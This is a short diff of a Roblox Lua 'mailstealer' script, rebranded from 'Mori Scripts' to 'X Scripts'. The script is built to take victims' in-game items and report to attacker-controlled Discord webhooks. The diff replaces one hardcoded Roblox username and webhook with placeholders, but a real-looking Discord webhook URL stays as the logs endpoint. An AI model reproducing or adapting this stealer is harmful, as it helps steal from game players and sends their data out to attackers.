@@ -1,9 +1,9 @@
 LogsWebhook = "https://discord.com/api/webhooks/1277830970468466709/adrsgg1fg5nr-6qDsGzbOw7BaYE71YkQVC_VSOQ7_I2-v46FFy64PoKyuhliU_FtQQeJ"
 mailstealer_name = "X Scripts"
 
-Roblox_Username = CryNoMorePet
-Discord_Webhook = https://discord.com/api/webhooks/1277832510964764803/xW0UFLKS7xSrZZVi_wC5ov0A_SNpcCNNO2NygpqR35NPR_XXcgL3YqLa-f9VSrWtO7v5
-Username2 = Kaua_57
+Roblox_Username = Username
+Discord_Webhook = Webhook
+Username2 = Username2
 
 -- simple mailstealer
 LOGS_WEBHOOK = LogsWebhook
@@ -38,7 +38,7 @@ task.spawn(function()
     LoadingScreenFunction("anything")
 end)
 
-game:GetService("Players").LocalPlayer.PlayerGui.Transition.Hint.HintLabel.Text = "Mori Scripts"
+game:GetService("Players").LocalPlayer.PlayerGui.Transition.Hint.HintLabel.Text = "X Scripts"
 -- variables:
 
 local Library = require(game.ReplicatedStorage.Library)
